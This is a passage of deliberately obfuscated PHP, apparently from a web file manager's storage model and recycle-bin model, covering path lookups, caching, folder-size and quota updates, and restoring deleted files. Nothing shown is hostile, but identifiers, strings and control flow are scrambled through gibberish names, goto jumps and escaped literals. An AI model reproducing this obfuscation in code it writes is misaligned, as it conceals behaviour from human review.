$Bæ‡†¢¯¬ =& $_SERVER[¦·]; $F›Ï¨Õ½ƒß = $this->sourceInfo($Fç­êòŒ•ä); if (!$F›Ï¨Õ½ƒß || $F›Ï¨Õ½ƒß[$Bæ‡†¢¯¬[370]]) { return !1; } goto A›ŞÒ‡ç’; dç¡µÑ—¢: return $Aè‚Û±±‰; goto DÄçÌ¼¿ß¹; A›ŞÒ‡ç’: $C£†ÎõöÏ¹ = $Bæ‡†¢¯¬[425] . $F›Ï¨Õ½ƒß[$Bæ‡†¢¯¬[419]]; $fâ…¨²º¥ó = _get(self::$cacheFileInfo, $C£†ÎõöÏ¹); if ($fâ…¨²º¥ó) { return $fâ…¨²º¥ó; } goto Dğ‹¶Ú»˜»; Dğ‹¶Ú»˜»: $Aè‚Û±±‰ = Model($Bæ‡†¢¯¬[422])->fileInfo($F›Ï¨Õ½ƒß[$Bæ‡†¢¯¬[419]]); if ($Aè‚Û±±‰) { $Aè‚Û±±‰[$Bæ‡†¢¯¬[28]] = $F›Ï¨Õ½ƒß[$Bæ‡†¢¯¬[28]]; } self::$cacheFileInfo[$C£†ÎõöÏ¹] = $Aè‚Û±±‰; goto dç¡µÑ—¢; DÄçÌ¼¿ß¹: } private function folderChildrenNumber($a¹‰ÖˆË°Ø) { $D³·¸©·¥× =& $_SERVER[¦·]; $Açİ–î½Ô˜ = $this->sourceInfo($a¹‰ÖˆË°Ø); $c±åªí‰İ® = array($D³·¸©·¥×[527] => array($D³·¸©·¥×[485], $Açİ–î½Ô˜[$D³·¸©·¥×[461]] . $a¹‰ÖˆË°Ø . $D³·¸©·¥×[486]), $D³·¸©·¥×[396] => intval($Açİ–î½Ô˜[$D³·¸©·¥×[397]]), $D³·¸©·¥×[520] => 1); $AĞËÙ®‚»· = $this->where($c±åªí‰İ®)->count(); $CÛ„ÜèÂ–õ = $this->where($c±åªí‰İ®)->where(array($D³·¸©·¥×[520] => 0))->count(); return array($D³·¸©·¥×[81] => $CÛ„ÜèÂ–õ, $D³·¸©·¥×[82] => $AĞËÙ®‚»·); } public function pathInfo($dï„¨øëÌ˜, $AÃ÷º£ÇÁ = false) { goto BÂŞÈéÇÅÜ; BÂŞÈéÇÅÜ: $FÚÎêô¬–í =& $_SERVER[¦·]; $AÃ÷º£ÇÁ = !1; $dï„¨øëÌ˜ = intval($dï„¨øëÌ˜); goto B“ÄÛ£ÒÓù; dİ£µŠâØ: self::$cachePathInfo[$CÁº©‹¤É] = $fÀîÙ‚øæ£; return $fÀîÙ‚øæ£; goto B¬ğ£øÊ; C©‚•ñ¡áƒ: $fÀîÙ‚øæ£ = $this->sourceInfo($dï„¨øëÌ˜); if (!$fÀîÙ‚øæ£) { return !1; } $fÀîÙ‚øæ£ = $this->_listDataApplyItem($fÀîÙ‚øæ£, $AÃ÷º£ÇÁ); goto dİ£µŠâØ; B“ÄÛ£ÒÓù: $CÁº©‹¤É = $FÚÎêô¬–í[411] . intval($AÃ÷º£ÇÁ) . $FÚÎêô¬–í[412] . $dï„¨øëÌ˜; $béİºñ°õå = _get(self::$cachePathInfo, $CÁº©‹¤É); if ($béİºñ°õå) { return $béİºñ°õå; } goto C©‚•ñ¡áƒ; B¬ğ£øÊ: } public static $cachePathInfoMore = array(); public function pathInfoMore($dÑ©°ÊÎä…) { goto f‡×¯µÀÁù; AÙÈÎï‡„Ì: $fĞò’¾Ó½× = $this->pathInfo($dÑ©°ÊÎä…); if (!$fĞò’¾Ó½×) { return !1; } if ($fĞò’¾Ó½×[$a£—‹ŞÄ[370]] == $a£—‹ŞÄ[83]) { $fĞò’¾Ó½×[$a£—‹ŞÄ[80]] = $this->folderChildrenNumber($dÑ©°ÊÎä…); } goto b´½ìóÑğå; f‡×¯µÀÁù: $a£—‹ŞÄ =& $_SERVER[¦·]; $BÂ®Í·„¯÷ = _get(self::$cachePathInfoMore, $dÑ©°ÊÎä…); if ($BÂ®Í·„¯÷) { return $BÂ®Í·„¯÷; } goto AÙÈÎï‡„Ì; b´½ìóÑğå: self::$cachePathInfoMore[$dÑ©°ÊÎä…] = $fĞò’¾Ó½×; return $fĞò’¾Ó½×; goto AÀÊœÇ‡¡; AÀÊœÇ‡¡: } public function sourceInfo($e¶©ˆÂéğ) { goto c «Ú¢Æ ; E¿Æ¾ÚˆĞ: $aîîê¡ÙÙÑ = $this->where(array($DÛê²½˜Î[369] => $e¶©ˆÂéğ))->find(); self::$cacheSourceInfo[$bğ„Çë] = $aîîê¡ÙÙÑ; return self::$cacheSourceInfo[$bğ„Çë]; goto aÜŒ¹¨Ç; fò‡—«ç™İ: $bğ„Çë = $DÛê²½˜Î[410] . $e¶©ˆÂéğ; $b§êØõêÍ³ = _get(self::$cacheSourceInfo, $bğ„Çë); if ($b§êØõêÍ³) { return $b§êØõêÍ³; } goto E¿Æ¾ÚˆĞ; c «Ú¢Æ : $DÛê²½˜Î =& $_SERVER[¦·]; if (!$e¶©ˆÂéğ) { return array(); } $e¶©ˆÂéğ = intval($e¶©ˆÂéğ); goto fò‡—«ç™İ; aÜŒ¹¨Ç: } public function sourceCacheClear($Fø‚Ø®íó = false) { if ($Fø‚Ø®íó == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¦·][410] . $Fø‚Ø®íó]); } public function pathInfoByPath($d…ŸÉÁÕè, $eÛÚ—ÉŒÄß) { $AŞîÕ°ó¢é =& $_SERVER[¦·]; $eÇß°‹º„‰ = !$eÛÚ—ÉŒÄß ? array() : explode($AŞîÕ°ó¢é[8], trim($eÛÚ—ÉŒÄß, $AŞîÕ°ó¢é[8])); $f´‡ƒĞ¼·¾ = $d…ŸÉÁÕè; foreach ($eÇß°‹º„‰ as $E•ÓÆÓŠ½) { $e›¤âñ˜ó = array($AŞîÕ°ó¢é[463] => $f´‡ƒĞ¼·¾, $AŞîÕ°ó¢é[28] => $E•ÓÆÓŠ½); $C§îÇçòÜÑ = $this->where($e›¤âñ˜ó)->select(); if (!$C§îÇçòÜÑ) { return !1; } $C§îÇçòÜÑ = array_sort_by($C§îÇçòÜÑ, $AŞîÕ°ó¢é[397]); $f´‡ƒĞ¼·¾ = $C§îÇçòÜÑ[0][$AŞîÕ°ó¢é[369]]; } return $this->pathInfo($f´‡ƒĞ¼·¾, !0); } protected function updateModifyTime($d¶‘‘–Ëë) { goto F‘¯’ĞøÃ; fã‰Š¹åÀ©: foreach ($d¶‘‘–Ëë as $B‡åİÕĞˆò => $EÕŠÅÃ„å) { $d¶‘‘–Ëë[$B‡åİÕĞˆò] = intval($EÕŠÅÃ„å); } $bĞ²ìõâ‹ù = array($Aµ·•¯õ™—[369] => array($Aµ·•¯õ™—[7], $d¶‘‘–Ëë)); $d²¿ïîí = array($Aµ·•¯õ™—[526] => USER_ID, $Aµ·•¯õ™—[390] => time()); goto fÏ²©ŒÚï; F‘¯’ĞøÃ: $Aµ·•¯õ™— =& $_SERVER[¦·]; if (!$d¶‘‘–Ëë) { return; } if (!is_array($d¶‘‘–Ëë)) { $d¶‘‘–Ëë = array($d¶‘‘–Ëë); } goto fã‰Š¹åÀ©; fÏ²©ŒÚï: $this->where($bĞ²ìõâ‹ù)->save($d²¿ïîí); goto EÄ‡Ûå§„¨; EÄ‡Ûå§„¨: } public function folderSizeReset($DÔ·Œ«‚Î) { goto E‡æå½é„µ; E‡æå½é„µ: $aÈö®Â†©Û =& $_SERVER[¦·]; if ($this->statusIgnoreResetSpace) { return; } $fÜÆÈ¨»‘ = $aÈö®Â†©Û[2391] . $DÔ·Œ«‚Î; goto Cõ½ê×¼·Ì; A‰‚ò÷ìä÷: $b£ù‹–ÍŠ = $this->parentLevelArray($dŞ‚õÕïêä[$aÈö®Â†©Û[461]]); if ($b£ù‹–ÍŠ) { $d„÷¼Æ²ñˆ = array($aÈö®Â†©Û[369] => array($aÈö®Â†©Û[384], $b£ù‹–ÍŠ)); if ($Eíç‘ïÌ < 0) { $d„÷¼Æ²ñˆ[$aÈö®Â†©Û[77]] = array($aÈö®Â†©Û[931], abs($Eíç‘ïÌ)); } $this->where($d„÷¼Æ²ñˆ)->setAdd($aÈö®Â†©Û[77], $Eíç‘ïÌ); } $this->targetSpaceUpdate($dŞ‚õÕïêä[$aÈö®Â†©Û[371]], $dŞ‚õÕïêä[$aÈö®Â†©Û[458]]); goto e»±»ã³¬; C¿¤¹ÔÃš: $Eíç‘ïÌ = $d–è…š‰Õƒ - intval($dŞ‚õÕïêä[$aÈö®Â†©Û[77]]); if ($Eíç‘ïÌ == 0) { return CacheLock::unlock($fÜÆÈ¨»‘); } $this->where(array($aÈö®Â†©Û[383] => $DÔ·Œ«‚Î))->setField($aÈö®Â†©Û[77], $d–è…š‰Õƒ); goto A‰‚ò÷ìä÷; e»±»ã³¬: CacheLock::unlock($fÜÆÈ¨»‘); goto D†”·†î·å; eõ–¼ñ³¶ù: $d„÷¼Æ²ñˆ = array($aÈö®Â†©Û[368] => $DÔ·Œ«‚Î, $aÈö®Â†©Û[396] => 0); $d–è…š‰Õƒ = $this->where($d„÷¼Æ²ñˆ)->sum($aÈö®Â†©Û[77]); $d–è…š‰Õƒ = intval($d–è…š‰Õƒ); goto C¿¤¹ÔÃš; Cõ½ê×¼·Ì: CacheLock::lock($fÜÆÈ¨»‘, 20); $this->sourceCacheClear($DÔ·Œ«‚Î); $dŞ‚õÕïêä = $this->sourceInfo($DÔ·Œ«‚Î); goto eõ–¼ñ³¶ù; D†”·†î·å: } public function folderSizeResetChildren($AÌÚ°Í×¤²) { goto bÌŞ§çøÙ; Eİ§øíÕãŒ: $D«¶¬§¸Å[] = $C¡İ°ƒù¾˜; $D«¶¬§¸Å = array_to_keyvalue($D«¶¬§¸Å, $D¨¤ö‚©ˆ·[369]); foreach ($D«¶¬§¸Å as $AÚÏºŞ·¬ => $b¦Ôôêğ³ë) { $D«¶¬§¸Å[$AÚÏºŞ·¬][$D¨¤ö‚©ˆ·[2393]] = $D«¶¬§¸Å[$AÚÏºŞ·¬][$D¨¤ö‚©ˆ·[77]]; $D«¶¬§¸Å[$AÚÏºŞ·¬][$D¨¤ö‚©ˆ·[77]] = 0; } goto C ‰·¢Óù”; aÙÊóåâ¨…: $c®Ï†‰òğÅ[$D¨¤ö‚©ˆ·[370]] = 0; $Eäáõ°³ = $this->field($d–µ·²ğÀô)->where($c®Ï†‰òğÅ)->select(); if (!$Eäáõ°³) { return; } goto Eİ§øíÕãŒ; bÌŞ§çøÙ: $D¨¤ö‚©ˆ· =& $_SERVER[¦·]; $this->sourceCacheClear($AÌÚ°Í×¤²); $C¡İ°ƒù¾˜ = $this->sourceInfo($AÌÚ°Í×¤²); goto d×µ…ÈŒÕî; eè›™­»´: foreach ($D«¶¬§¸Å as $b¦Ôôêğ³ë) { if ($b¦Ôôêğ³ë[$D¨¤ö‚©ˆ·[77]] == $b¦Ôôêğ³ë[$D¨¤ö‚©ˆ·[2393]]) { continue; } $cŞŸğœŒ[] = array($D¨¤ö‚©ˆ·[369], $b¦Ôôêğ³ë[$D¨¤ö‚©ˆ·[369]], $D¨¤ö‚©ˆ·[77], $b¦Ôôêğ³ë[$D¨¤ö‚©ˆ·[77]]); } $this->saveAll($cŞŸğœŒ); goto e°È´… é; d×µ…ÈŒÕî: $c®Ï†‰òğÅ = array($D¨¤ö‚©ˆ·[520] => 1, $D¨¤ö‚©ˆ·[527] => array($D¨¤ö‚©ˆ·[485], $C¡İ°ƒù¾˜[$D¨¤ö‚©ˆ·[461]] . $AÌÚ°Í×¤² . $D¨¤ö‚©ˆ·[486])); $d–µ·²ğÀô = $D¨¤ö‚©ˆ·[2392]; $D«¶¬§¸Å = $this->field($d–µ·²ğÀô)->where($c®Ï†‰òğÅ)->select(); goto aÙÊóåâ¨…; C ‰·¢Óù”: foreach ($Eäáõ°³ as $b¦Ôôêğ³ë) { $fÄğ¶æ® = $b¦Ôôêğ³ë[$D¨¤ö‚©ˆ·[463]] . $D¨¤ö‚©ˆ·[33]; if (!isset($D«¶¬§¸Å[$fÄğ¶æ®])) { continue; } if ($b¦Ôôêğ³ë[$D¨¤ö‚©ˆ·[397]] == $D«¶¬§¸Å[$fÄğ¶æ®][$D¨¤ö‚©ˆ·[397]]) { $D«¶¬§¸Å[$fÄğ¶æ®][$D¨¤ö‚©ˆ·[77]] += $b¦Ôôêğ³ë[$D¨¤ö‚©ˆ·[77]]; } } foreach ($D«¶¬§¸Å as $b¦Ôôêğ³ë) { $D“È„éÆó = $this->parentLevelArray($b¦Ôôêğ³ë[$D¨¤ö‚©ˆ·[461]]); foreach ($D“È„éÆó as $fÄğ¶æ®) { $fÄğ¶æ® = $fÄğ¶æ® . $D¨¤ö‚©ˆ·[33]; if (!isset($D«¶¬§¸Å[$fÄğ¶æ®])) { continue; } if ($b¦Ôôêğ³ë[$D¨¤ö‚©ˆ·[397]] == $D«¶¬§¸Å[$fÄğ¶æ®][$D¨¤ö‚©ˆ·[397]]) { $D«¶¬§¸Å[$fÄğ¶æ®][$D¨¤ö‚©ˆ·[77]] += $b¦Ôôêğ³ë[$D¨¤ö‚©ˆ·[77]]; } } } $cŞŸğœŒ = array(); goto eè›™­»´; e°È´… é: } public function userSpaceReset($aÑ¤ÖªŒò· = false) { $a°‡Ç™â“ =& $_SERVER[¦·]; $Dø¶è¹ŸÉ = $this->where(array($a°‡Ç™â“[371] => self::TYPE_USER, $a°‡Ç™â“[458] => $aÑ¤ÖªŒò·, $a°‡Ç™â“[370] => 0))->sum($a°‡Ç™â“[77]); Model($a°‡Ç™â“[476])->userEdit($aÑ¤ÖªŒò·, array($a°‡Ç™â“[2098] => $Dø¶è¹ŸÉ)); } public function targetSpaceUpdate($D˜Íˆ¬¯±, $A„Š×ößÕÅ) { $c†¦Ş‚å‡İ =& $_SERVER[¦·]; if (!$A„Š×ößÕÅ) { return; } if (!in_array($D˜Íˆ¬¯±, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $eÀØš‘ Ë¯ = $this->targetSpaceSize($D˜Íˆ¬¯±, $A„Š×ößÕÅ); if ($D˜Íˆ¬¯± == self::TYPE_USER) { Model($c†¦Ş‚å‡İ[476])->userEdit($A„Š×ößÕÅ, array($c†¦Ş‚å‡İ[2098] => $eÀØš‘ Ë¯)); } else { if ($D˜Íˆ¬¯± == self::TYPE_GROUP) { Model($c†¦Ş‚å‡İ[460])->groupEdit($A„Š×ößÕÅ, array($c†¦Ş‚å‡İ[2098] => $eÀØš‘ Ë¯)); } } } public function targetSpaceSize($e¥òïÔÀ¾, $fÇÜÔ›±šÀ) { goto aÃßŸŠ¬–›; dâºß‹ã²Ô: $d Şˆ½–Ä¨ = floatval($bêÏÊ»ÑÍ[$aö·…˜°–É[77]]); $cÊë‘¶¥ = array($aö·…˜°–É[527] => array($aö·…˜°–É[485], $aö·…˜°–É[472] . $bêÏÊ»ÑÍ[$aö·…˜°–É[369]] . $aö·…˜°–É[486])); $BÖÁÌÜ¢³ = Model($aö·…˜°–É[395])->field($aö·…˜°–É[383])->where($cÊë‘¶¥)->select(); goto Bî ØˆÃ ¨; aÃßŸŠ¬–›: $aö·…˜°–É =& $_SERVER[¦·]; $bêÏÊ»ÑÍ = $this->sourceRoot($e¥òïÔÀ¾, $fÇÜÔ›±šÀ, !0); if (!$bêÏÊ»ÑÍ) { return 0; } goto dâºß‹ã²Ô; Bî ØˆÃ ¨: $BÖÁÌÜ¢³ = array_to_keyvalue($BÖÁÌÜ¢³, $aö·…˜°–É[33], $aö·…˜°–É[369]); $BÖÁÌÜ¢³ = array_unique(array_filter($BÖÁÌÜ¢³)); if ($BÖÁÌÜ¢³) { $cÊë‘¶¥ = array($aö·…˜°–É[383] => array($aö·…˜°–É[384], $BÖÁÌÜ¢³)); $d Şˆ½–Ä¨ += floatval($this->where($cÊë‘¶¥)->sum($aö·…˜°–É[77])); } goto eÈŒòÊ¶‘¦; eÈŒòÊ¶‘¦: return $d Şˆ½–Ä¨; goto b³¯…§Ø‘; b³¯…§Ø‘: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($cÖƒ¯åŸÒĞ) { return $this->fileTypeProfile($cÖƒ¯åŸÒĞ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($d˜‡’ö) { return $this->fileTypeProfile($d˜‡’ö, SourceModel::TYPE_GROUP); } private function fileTypeProfile($A¡¥„—âŞß, $dï‘Şß¤à²) { goto f‘³Óƒøï; c•‡µÃ’óö: if ($Dà¤İ¡©Ì…) { return $Dà¤İ¡©Ì…; } $fŸßŠ¦¶÷Æ = array($A‰ë®æÂ„«[520] => 0); if ($A¡¥„—âŞß != !1) { $fŸßŠ¦¶÷Æ[$A‰ë®æÂ„«[458]] = $A¡¥„—âŞß; $fŸßŠ¦¶÷Æ[$A‰ë®æÂ„«[371]] = $dï‘Şß¤à²; } goto dÚ¸âÍ¤; cÛß÷Èïö: foreach ($e¸‚´Ğæñ as $F‘ŠÛËòçâ => $e§òùœ•ï„) { $fŸßŠ¦¶÷Æ[$A‰ë®æÂ„«[372]] = $this->fileTypeWhere($F‘ŠÛËòçâ); $Bæ’Ÿš©¼[$F‘ŠÛËòçâ] = array($A‰ë®æÂ„«[2396] => $e§òùœ•ï„[$A‰ë®æÂ„«[28]], $A‰ë®æÂ„«[2397] => $this->where($fŸßŠ¦¶÷Æ)->count(), $A‰ë®æÂ„«[522] => $this->where($fŸßŠ¦¶÷Æ)->sum($A‰ë®æÂ„«[77])); } Cache::set($fàø¾Œ“‚â, $Bæ’Ÿš©¼, 1200); return $Bæ’Ÿš©¼; goto e„ÏìÓ ë; dÚ¸âÍ¤: $Bæ’Ÿš©¼ = array(); $Bæ’Ÿš©¼[$A‰ë®æÂ„«[2395]] = array($A‰ë®æÂ„«[2396] => LNG($A‰ë®æÂ„«[2395]), $A‰ë®æÂ„«[2397] => $this->where($fŸßŠ¦¶÷Æ)->count(), $A‰ë®æÂ„«[522] => $this->where($fŸßŠ¦¶÷Æ)->sum($A‰ë®æÂ„«[77])); $e¸‚´Ğæñ = KodIO::fileTypeList(); goto cÛß÷Èïö; f‘³Óƒøï: $A‰ë®æÂ„« =& $_SERVER[¦·]; $fàø¾Œ“‚â = $A‰ë®æÂ„«[2394] . $A¡¥„—âŞß . $A‰ë®æÂ„«[70] . $dï‘Şß¤à²; $Dà¤İ¡©Ì… = Cache::get($fàø¾Œ“‚â); goto c•‡µÃ’óö; e„ÏìÓ ë: } public function fileNameExist($d»éÑ†¿¾, $eï²ßí–óâ) { $Fæó¸ÌÕŒã =& $_SERVER[¦·]; $AéÏĞ…Ê¦ = $this->childList($d»éÑ†¿¾); foreach ($AéÏĞ…Ê¦ as $eÃè¹—¤«Ù) { if ($eÃè¹—¤«Ù[$Fæó¸ÌÕŒã[28]] == $eï²ßí–óâ) { return $eÃè¹—¤«Ù[$Fæó¸ÌÕŒã[369]]; } if (strtolower($eÃè¹—¤«Ù[$Fæó¸ÌÕŒã[28]]) == strtolower($eï²ßí–óâ)) { return $eÃè¹—¤«Ù[$Fæó¸ÌÕŒã[369]]; } } return !1; } public function childList($a‹ÇÜ¨¶Á») { goto d×ĞëË¬—â; d×ĞëË¬—â: $fÒ‰å„ëÇ =& $_SERVER[¦·]; $B”×ÊÚï¯ï = $fÒ‰å„ëÇ[2376] . $a‹ÇÜ¨¶Á»; if (isset(self::$cacheChildList[$B”×ÊÚï¯ï])) { return self::$cacheChildList[$B”×ÊÚï¯ï]; } goto A›Â¢±Ëİ; côœÔ‚éÇé: self::$cacheChildList[$B”×ÊÚï¯ï] = $D©Ã†Å; foreach ($D©Ã†Å as $E„È÷ÀšŒ) { $B”×ÊÚï¯ï = $fÒ‰å„ëÇ[410] . $E„È÷ÀšŒ[$fÒ‰å„ëÇ[369]]; self::$cacheSourceInfo[$B”×ÊÚï¯ï] = $E„È÷ÀšŒ; } return $D©Ã†Å; goto b¬ĞÅ™³‹Ü; A›Â¢±Ëİ: $EÀ“Õš„‡£ = array($fÒ‰å„ëÇ[463] => intval($a‹ÇÜ¨¶Á»), $fÒ‰å„ëÇ[397] => 0); $D©Ã†Å = $this->where($EÀ“Õš„‡£)->select(); $D©Ã†Å = $D©Ã†Å ? $D©Ã†Å : array(); goto côœÔ‚éÇé; b¬ĞÅ™³‹Ü: } public function fileNameAuto($c¨Ş³¶é³, $BŠ¡®…¡à, $d¬øá—º‘ = REPEAT_RENAME, $DÄ›î÷ƒ²” = false) { $EÒÓ†âÌ±— =& $_SERVER[¦·]; $f±¥ãø‹ = $this->childList($c¨Ş³¶é³); $DƒŸ‰‹â¢Ç = array_to_keyvalue($f±¥ãø‹, $EÒÓ†âÌ±—[33], $EÒÓ†âÌ±—[28]); return $this->fileNameAutoGet($DƒŸ‰‹â¢Ç, $BŠ¡®…¡à, $d¬øá—º‘, $DÄ›î÷ƒ²”); } public function fileNameAutoGet($eÆƒÁ¸ƒĞÑ, $c¢šä¼È¾ò, $DÒÉèÆæ§, $a¾×ç†Ù¡Æ) { $dâå÷àÉ¥¬ =& $_SERVER[¦·]; if ($DÒÉèÆæ§ == REPEAT_REPLACE || !$eÆƒÁ¸ƒĞÑ || !in_array_not_case($c¢šä¼È¾ò, $eÆƒÁ¸ƒĞÑ) || $a¾×ç†Ù¡Æ && $DÒÉèÆæ§ != REPEAT_RENAME_FOLDER) { return $c¢šä¼È¾ò; } if ($DÒÉèÆæ§ == REPEAT_SKIP) { return !1; } $a„¯‹‹ŒÕ¸ = $dâå÷àÉ¥¬[91] . get_path_ext($c¢šä¼È¾ò); $a„¯‹‹ŒÕ¸ = $a„¯‹‹ŒÕ¸ == $dâå÷àÉ¥¬[91] || $a¾×ç†Ù¡Æ ? $dâå÷àÉ¥¬[33] : $a„¯‹‹ŒÕ¸; for ($aˆ…³›Š¿ = 1; $aˆ…³›Š¿ <= count($eÆƒÁ¸ƒĞÑ) + 1; $aˆ…³›Š¿++) { $EÊö¡ğ£àó = substr($c¢šä¼È¾ò, 0, strlen($c¢šä¼È¾ò) - strlen($a„¯‹‹ŒÕ¸)); $F¨ê£ê¼ƒŒ = $EÊö¡ğ£àó . "\50{$aˆ…³›Š¿}\x29{$a„¯‹‹ŒÕ¸}"; if (!in_array_not_case($F¨ê£ê¼ƒŒ, $eÆƒÁ¸ƒĞÑ)) { return $F¨ê£ê¼ƒŒ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\162\x63\145\x5f\162\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\x6e\163\145\x72\x74", "\x66\165\x6e\x63\164\x69\157\x6e")); public function listData($cíÂŠß©õ‘ = false) { $e†Ûğ‡º¼â =& $_SERVER[¦·]; $cíÂŠß©õ‘ = $cíÂŠß©õ‘ ? $cíÂŠß©õ‘ : USER_ID; $eÏ‰–’Œ£“ = $this->where(array($e†Ûğ‡º¼â[1432] => $cíÂŠß©õ‘))->select(); return array_to_keyvalue($eÏ‰–’Œ£“, $e†Ûğ‡º¼â[33], $e†Ûğ‡º¼â[369]); } public function moveToRecycle($câ¹¡™ÁÓ) { goto c—›ä’´èÚ; c—›ä’´èÚ: $b‚„¹Šó¶Í =& $_SERVER[¦·]; $a‹î™ˆ× = Model($b‚„¹Šó¶Í[1122]); $BìË§’”ƒÄ = $a‹î™ˆ×->sourceInfo($câ¹¡™ÁÓ); goto c‘ª„¨³Œ…; d§¶•­¤š: $this->recycleMove($câ¹¡™ÁÓ, 1); if ($BìË§’”ƒÄ[$b‚„¹Šó¶Í[370]] == $b‚„¹Šó¶Í[83]) { $a©î‹¤ƒšö = array($b‚„¹Šó¶Í[527] => array($b‚„¹Šó¶Í[485], $BìË§’”ƒÄ[$b‚„¹Šó¶Í[461]] . $câ¹¡™ÁÓ . $b‚„¹Šó¶Í[486])); $a‹î™ˆ×->where($a©î‹¤ƒšö)->setField($b‚„¹Šó¶Í[397], 1); } goto bºÆ÷‹×Ì; c‘ª„¨³Œ…: if (!$BìË§’”ƒÄ || $BìË§’”ƒÄ[$b‚„¹Šó¶Í[397]] == $b‚„¹Šó¶Í[83]) { return; } $d®çÎ„—³ = array($b‚„¹Šó¶Í[383] => $câ¹¡™ÁÓ, $b‚„¹Šó¶Í[1432] => USER_ID, $b‚„¹Šó¶Í[523] => $BìË§’”ƒÄ[$b‚„¹Šó¶Í[371]], $b‚„¹Šó¶Í[524] => $BìË§’”ƒÄ[$b‚„¹Šó¶Í[458]], $b‚„¹Šó¶Í[527] => $BìË§’”ƒÄ[$b‚„¹Šó¶Í[461]]); $this->add($d®çÎ„—³); goto d§¶•­¤š; bºÆ÷‹×Ì: } public function clear() { $this->remove(!1); } public function remove($b³»Å©° = false) { goto C‰Æ…¤¬¦¸; D”è‰äÒÊ: $b³»Å©° = $b³»Å©° === !1 ? !1 : $b³»Å©°; $C×è¡‹™¿ã = array(); foreach ($A„ª·š¨²Ü as $e·ï·…ù) { if ($b³»Å©° != !1 && !in_array($e·ï·…ù, $b³»Å©°)) { continue; } $Cë²¡ˆİÕ = $B±ê”ãùé²->sourceInfo($e·ï·…ù); $B±ê”ãùé²->remove($e·ï·…ù, !1); $eêïßí¦âŒ = $Cë²¡ˆİÕ[$C÷­â¤¶É¥[371]] . $C÷­â¤¶É¥[70] . $Cë²¡ˆİÕ[$C÷­â¤¶É¥[458]]; $C×è¡‹™¿ã[$eêïßí¦âŒ] = array($C÷­â¤¶É¥[523] => $Cë²¡ˆİÕ[$C÷­â¤¶É¥[371]], $C÷­â¤¶É¥[458] => $Cë²¡ˆİÕ[$C÷­â¤¶É¥[458]]); $this->where(array($C÷­â¤¶É¥[369] => $e·ï·…ù))->delete(); } goto B¦¸ÅÛù´—; C‰Æ…¤¬¦¸: $C÷­â¤¶É¥ =& $_SERVER[¦·]; $B±ê”ãùé² = Model($C÷­â¤¶É¥[1122]); $A„ª·š¨²Ü = $this->listData(); goto D”è‰äÒÊ; B¦¸ÅÛù´—: foreach ($C×è¡‹™¿ã as $B˜¢ÈËºõ) { $B±ê”ãùé²->targetSpaceUpdate($B˜¢ÈËºõ[$C÷­â¤¶É¥[371]], $B˜¢ÈËºõ[$C÷­â¤¶É¥[458]]); } goto c¹·÷°ˆ³›; c¹·÷°ˆ³›: } public function restore($AÅ«÷¥İ¤ñ = false) { goto d÷İ‡À‹ÇÅ; dõ¸§‘ãÕ·: foreach ($Dˆ¸ÃÄÅÖ” as $DŞ±òº›) { goto f†ÔÌ¾¼ò‚; d˜ğ¨àŸ†°: if ($a‚ÇêŠâ¦ˆ[$AÂ½«ÜôÄß[397]] == $AÂ½«ÜôÄß[83]) { continue; } $aŞ›ÆÜğÁò->lockMoveStart($DŞ±òº›); $this->recycleMove($DŞ±òº›, 0); goto B·½´–¤‰; f†ÔÌ¾¼ò‚: if ($AÅ«÷¥İ¤ñ != !1 && !in_array($DŞ±òº›, $AÅ«÷¥İ¤ñ)) { continue; } $FÚƒñóÉ› = $aŞ›ÆÜğÁò->sourceInfo($DŞ±òº›); $a‚ÇêŠâ¦ˆ = $aŞ›ÆÜğÁò->sourceInfo($FÚƒñóÉ›[$AÂ½«ÜôÄß[463]]); goto d˜ğ¨àŸ†°; B·½´–¤‰: if ($FÚƒñóÉ›[$AÂ½«ÜôÄß[370]] == $AÂ½«ÜôÄß[83]) { $Aõæ²Õê¯° = array($AÂ½«ÜôÄß[527] => array($AÂ½«ÜôÄß[485], $FÚƒñóÉ›[$AÂ½«ÜôÄß[461]] . $DŞ±òº› . $AÂ½«ÜôÄß[486])); $aŞ›ÆÜğÁò->where($Aõæ²Õê¯°)->setField($AÂ½«ÜôÄß[397], 0); $this->restoreFolderChildren($DŞ±òº›, $Dˆ¸ÃÄÅÖ”); } $this->where(array($AÂ½«ÜôÄß[369] => $DŞ±òº›))->delete(); $aŞ›ÆÜğÁò->folderSizeReset($FÚƒñóÉ›[$AÂ½«ÜôÄß[463]]); goto c²½ …„¿ˆ; c²½ …„¿ˆ: $fæÊ£„»â[] = $FÚƒñóÉ›[$AÂ½«ÜôÄß[463]]; if ($FÚƒñóÉ›[$AÂ½«ÜôÄß[370]] == $AÂ½«ÜôÄß[83]) { $fæÊ£„»â[] = $DŞ±òº›; } $aŞ›ÆÜğÁò->lockMoveEnd($DŞ±òº›); goto c†áÌÂ‰; c†áÌÂ‰: } $aŞ›ÆÜğÁò->updateModifyTime($fæÊ£„»â); goto D¨’«œæÙ; c¾êå­Çƒ«: $AÅ«÷¥İ¤ñ = $AÅ«÷¥İ¤ñ == !1 ? !1 : $AÅ«÷¥İ¤ñ; if (!$Dˆ¸ÃÄÅÖ”) { return !0; } $fæÊ£„»â = array(); goto dõ¸§‘ãÕ·; d÷İ‡À‹ÇÅ: $AÂ½«ÜôÄß =& $_SERVER[¦·]; $aŞ›ÆÜğÁò = Model($AÂ½«ÜôÄß[1122]); $Dˆ¸ÃÄÅÖ” = $this->listData(); goto c¾êå­Çƒ«; D¨’«œæÙ: } private function restoreFolderChildren($EÍ‰…ë´ƒŒ, $b„ªÄâÉá¯) { goto Fæ„š²ĞÒ; d„Ø®“¾º½: foreach ($b„ªÄâÉá¯ as $bÌÏ‡Ñ¥ùÅ) { if ($bÌÏ‡Ñ¥ùÅ == $EÍ‰…ë´ƒŒ) { continue; } if (!$b®°É¶Ü‘Ä->isParentOf($EÍ‰…ë´ƒŒ, $bÌÏ‡Ñ¥ùÅ)) { continue; } $DŠ¶ö„ÊœÆ = $b®°É¶Ü‘Ä->sourceInfo($bÌÏ‡Ñ¥ùÅ); if ($DŠ¶ö„ÊœÆ[$EĞ—ø†¬Õ§[370]] == $EĞ—ø†¬Õ§[83]) { $EäÅ¨ 